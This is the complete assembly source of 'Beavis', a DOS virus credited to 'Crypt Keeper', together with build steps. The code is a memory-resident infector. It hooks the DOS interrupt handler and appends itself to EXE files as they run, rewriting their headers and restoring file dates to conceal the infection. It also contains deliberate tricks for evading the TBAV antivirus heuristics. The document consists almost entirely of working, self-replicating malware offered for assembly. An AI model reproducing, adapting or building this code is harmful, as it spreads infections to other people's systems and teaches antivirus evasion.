;****************************************************************************
;*                                  Beavis                                  *
;*                             by Crypt Keeper                              *
;****************************************************************************
 
;Beavis is a memory resident infector of EXE files that infects files as
;they are executed.  It only loads itself resident if a high memory manager
;is present, loading itself into the UMB (above 640k).  It triggers randomly
;at file execution, displaying a random Beavis quote from Beavis and Butthead.
 
;TASM BEAVIS.ASM /M3
;TLINK BEAVIS.OBJ
;EXE2BIN BEAVIS.EXE BEAVIS.COM
;.COM file is ready to run with no modifications.
 
	.model tiny
	.code
 
vtop    equ     $                      ;top of virus code block
 
;Equates --------------------------------------------------------------------
 
vlength equ     vbot-vtop              ;virus length in bytes
heapsiz equ     hbot-heap              ;heap size in bytes
vlres   equ     ((vlength+heapsiz)/16)+1  ;virus length in paragraphs
vlpage  equ     (vlength/512)+1        ;virus length in pages
chkfunc equ     9AD5h                  ;check resident int 21h function
virusid equ     150h                   ;virus ID word in exeheader
 
;----------------------------------------------------------------------------
 
	cld                            ;clear direction flag
 
	db      0BDh                   ;mov bp,
delta   dw      100h                   ;delta offset
 
	lea sp,[bp+(offset(sspace)+30)] ;set up new stack
 
	push ds
	push es                        ;save original EXE segments
 
	mov ax,chkfunc
	xor cx,cx
	mov ds,cx
	pushf                          ;This calls INT 21h while eliminating
	call dword ptr ds:[21h*4]      ;TBAV's undocumented DOS call flag.
 
	push cs
	pop ds
 
	cmp ax,chkfunc-1               ;did virus return reply?
	jne install                    ;if not, install resident
	
	jmp return                     ;if so, return to original program
 
install:
	mov ax,3521h                   ;get int 21h vector
	int 21h
 
	mov [bp+offset(i21veco)],bx
	mov [bp+offset(i21vecs)],es
 
	mov ax,4300h                   ;get himem.sys installed state
	int 2Fh                        ;multiplex interrupt
 
	cmp al,80h                     ;80h in al means himem.sys is loaded
	jne return                     ;Return if no High-Memory manager
 
	mov ax,4310h                   ;get himem.sys entry point adress
	int 2Fh
 
	mov [bp+offset(himem_s)],es
	mov [bp+offset(himem_o)],bx    ;himem.sys entry point
 
	mov ah,10h                     ;allocate UMB (function 10h)
	mov dx,vlres                   ;paragraphs to request
 
	call dword ptr [bp+offset(himem_o)] ;call himem.sys
	mov es,bx                      ;BX will contain segment of memory
 
	mov si,bp                      ;bp=start of virus code
	mov cx,(vlength+(heapsiz+1))/2 ;virus length in words+heap data
	xor di,di
 
	rep movsw                      ;copy virus code up there
 
	push es
	pop ds
 
	mov dx,offset(i21vec)          ;new int 21h vector
	mov ax,2521h                   ;set int 21h vector
	int 21h
 
return: mov ah,51h                     ;Get PSP adress
	int 21h
 
	add bx,16                      ;Compensate for PSP size
 
	pop es
	pop ds                         ;Restore original ES and DS from EXE
	
	cli                            ;Clear interrupts for stack change
 
	mov sp,cs:[bp+offset(old_sp)]
	mov ax,cs:[bp+offset(old_ss)]
	add ax,bx                      ;Find segment for SS
	mov ss,ax                      ;Reset original EXE stack
	
	sti
 
	add cs:[bp+offset(old_cs)],bx  ;Find segment for CS
 
	jmp dword ptr cs:[bp+offset(old_ip)] ;Far jump to original EXE code
 
;----------------------------------------------------------------------------
 
move_pointer_end:
	xor cx,cx
	xor dx,dx                      ;move pointer 0 bytes
	
	mov ax,4202h                   ;move pointer to end of file
	int 21h
	ret
 
;Data -----------------------------------------------------------------------
 
talk1   db      'FIRE FIRE FIRE!$'
talk2   db      'Hey butthead this sucks change the channel!$'
talk3   db      'Shut up butthead or I''ll kick your ass!$'
talk4   db      'We''re there dude.$'
talk5   db      'The Beavis virus kicks ass!$'
 
old_sp  dw      0
old_ss  dw      0FFF0h                 ;Old SS:SP
old_ip  dw      0
old_cs  dw      0FFF0h                 ;Old CS:IP
 
;----------------------------------------------------------------------------
 
i21vec: nop
 
	xchg ax,cx                     ;get rid of TBAV's execution intercept
				       ;heuristic flag.
 
	cmp cx,4B00h                   ;load and execute program?
	je vtrigger
 
	cmp cx,4B01h                   ;load program?
	je vtrigger
	
	xchg ax,cx
 
	cmp ax,chkfunc                 ;check if virus is resident?
	je return_reply
 
	jmp dword ptr cs:i21veco
return_reply:
	dec ax                         ;decrement AX
	iret                           ;return from interrupt
vtrigger:
	xchg ax,cx
 
	push ax si bx cx di es ds dx   ;save all used registers
 
	mov ax,4300h                   ;get file attributes
	int 21h
 
	jc exitvec                     ;exit if filename invalid
 
	mov cs:oldattr,cx              ;save old file attributes
 
	xor cx,cx                      ;set attributes to normal
	mov ax,4301h                   ;set file attributes
	int 21h
 
	mov ax,3D02h                   ;open file for read/write access
	int 21h
 
	jc exitvec                     ;exit if open permission denied
 
	mov bx,ax                      ;file handle
	push cs
	pop ds
 
	mov ax,5700h                   ;get file date and time
	int 21h
 
	mov olddate,dx
	mov oldtime,cx                 ;save old file date and time
 
	mov cx,28                      ;28 bytes to read
	mov dx,offset(readbuffer)      ;buffer to recieve data
 
	mov ah,3Fh                     ;read file or device
	int 21h
 
	cmp ax,28
	jb closeexit                   ;close and exit if file too small
 
	cmp init_sp,virusid            ;is file alredy infected?
	je closeexit
 
	mov ax,idword
	xor ax,0ABCDh                  ;kill TBAV's check exe/com flag
	cmp ax,0E697h
	je infect_exe
	cmp ax,0F180h
	je infect_exe                  ;if MZ or ZM, go ahead and infect
 
	jmp short closeexit            ;if not, don't infect
 
exitvec:
	pop dx ds es di cx bx si ax    ;restore all used registers
 
	jmp dword ptr cs:i21veco       ;execute rest of interrupt chain
closeexit:
	mov cx,oldtime
	mov dx,olddate                 ;restore old time and date
 
	mov ax,5701h                   ;set file date and time
	int 21h
 
	mov ah,3Eh                     ;close file with handle
	int 21h
 
	mov cx,cs:oldattr              ;old file attributes
	pop dx ds
	push ds dx                     ;get old filename off stack
 
	mov ax,4301h                   ;set file attributes
	int 21h
 
	mov ah,2Ch                     ;get time
	int 21h
 
	cmp cl,dh                      ;do seconds and minutes line up?
	jne exitvec                    ;if not, no trigger
 
	push cs
	pop ds
 
	inc dl
	mov al,dl
	xor ah,ah
	mov bl,20
	div bl                         ;convert to random number 0-5
 
	cmp al,0
	je _talk1
	cmp al,1
	je _talk2
	cmp al,2
	je _talk3
	cmp al,3
	je _talk4
	cmp al,4
	je _talk5                      ;select message
 
_talk1: mov dx,offset(talk1)
	jmp short _talk
_talk2: mov dx,offset(talk2)
	jmp short _talk
_talk3: mov dx,offset(talk3)
	jmp short _talk
_talk4: mov dx,offset(talk4)
	jmp short _talk
_talk5: mov dx,offset(talk5)
 
_talk:  mov ah,9                       ;print string
	int 21h
 
	jmp short exitvec              ;exit
 
infect_exe:
	les si,dword ptr ds:init_ss    ;get initial SS:SP (reversed)
	mov old_ss,si
	mov old_sp,es
	
	les si,dword ptr ds:init_ip    ;get initial CS:IP
	mov old_cs,es
	mov old_ip,si
	
	call move_pointer_end          ;move file pointer to end of file
 
	mov cx,10h
	div cx                         ;convert to paragraphs
 
	push ax
	sub ax,hsize                   ;subtract header size in paragraphs
 
	pop cx
	cmp ax,cx
	ja _closeexit                  ;If file too small, end infection
 
	mov init_cs,ax
	mov init_ip,dx                 ;set initial CS:IP in exe header
	mov delta,dx                   ;set delta offset in virus
 
	mov init_sp,virusid
	mov init_ss,ax                 ;set initial SS:SP in exe header
	
	add word ptr ds:minmem,vlres   ;add virus length to minimum memory
 
	mov cx,vlength                 ;number of bytes in virus
	xor dx,dx
 
	mov ah,40h                     ;write file or device
	int 21h
 
	call move_pointer_end          ;move file pointer to end of file
	
	mov cx,512
	div cx                         ;change bytes in new file to pages
	cmp dx,0                       ;no remainder?
	je go_ahead_set
	
	inc ax                         ;if remainder, add another page
 
go_ahead_set:
	mov word ptr pages,ax
	mov word ptr lastpg,dx         ;set EXE file size
 
	xor dx,dx
	xor cx,cx
 
	mov ax,4200h                   ;move file pointer to beginning of file
	int 21h
 
	mov cx,28                      ;28 bytes in header
	mov dx,offset(readbuffer)
 
	mov ah,40h                     ;write file or device
	int 21h
 
_closeexit:
	jmp closeexit                  ;close and exit
 
;----------------------------------------------------------------------------
 
copr    db      '[BEAVIS] by Crypt Keeper'
 
;----------------------------------------------------------------------------
 
vbot    equ     $                      ;bottom of virus code
heap    equ     $                      ;Beginning of heap
 
readbuffer:
idword  dw      0                      ;ID word
lastpg  dw      0                      ;Number of bytes in last page
pages   dw      0                      ;Total pages
segent  dw      0                      ;number of entries in segment table
hsize   dw      0                      ;header size in paragraphs
minmem  dw      0                      ;minimum memory to request
maxmem  dw      0                      ;maximum memory to request
init_ss dw      0                      ;initial SS value
init_sp dw      0                      ;initial SP value
negchk  dw      0                      ;negative checksum
init_ip dw      0                      ;initial IP value
init_cs dw      0                      ;initial CS value
reltab  dw      0                      ;offset of relocation table from header
ovnum   dw      0                      ;overlay number
 
himem_o dw      0
himem_s dw      0                      ;himem.sys entry point adress
 
i21veco dw      0
i21vecs dw      0                      ;int 21h vector
 
oldattr dw      0                      ;old file attributes
 
oldtime dw      0
olddate dw      0                      ;old saved time and date
 
hbot    equ     $                      ;bottom of heap
 
sspace  db      32 dup (0)             ;virus stack space
				       ;not used when resident so not
				       ;included in heap space
 
	end

